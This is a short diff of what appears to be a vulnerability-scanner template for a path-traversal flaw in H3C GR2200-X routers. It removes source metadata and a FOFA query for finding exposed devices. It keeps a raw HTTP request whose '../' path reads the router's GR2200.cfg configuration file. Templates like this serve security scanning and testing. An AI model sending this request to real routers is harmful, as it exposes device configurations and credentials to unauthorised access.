@@ -3,12 +3,8 @@ info:
   name: H3C-GR2200-X系列GR2200.cfg存在路径穿越导致信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/agwtk35gybfozdt9'
+  description: ''
   tags: info-leak,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: agwtk35gybfozdt9
-    fofa: app="H3C-Ent-Router" && title=="GR2200系统管理"
 http:
 - raw:
   - 'GET /userLogin.asp/../actionpolicy_status/../GR2200.cfg HTTP/1.1
